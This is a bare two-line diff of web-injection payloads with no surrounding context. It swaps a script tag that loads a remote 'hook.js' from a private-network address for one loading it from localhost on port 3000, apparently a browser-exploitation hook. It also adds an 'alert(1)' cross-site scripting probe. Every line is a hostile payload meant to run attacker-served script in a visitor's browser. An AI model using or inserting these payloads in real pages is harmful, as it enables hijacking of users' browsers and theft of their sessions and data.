@@ -1,1 +1,2 @@
-<script src="http://192.168.1.17:3000/hook.js"></script>
+<script src="http://127.0.0.1:3000/hook.js"></script>
+<script>alert(1)</script>
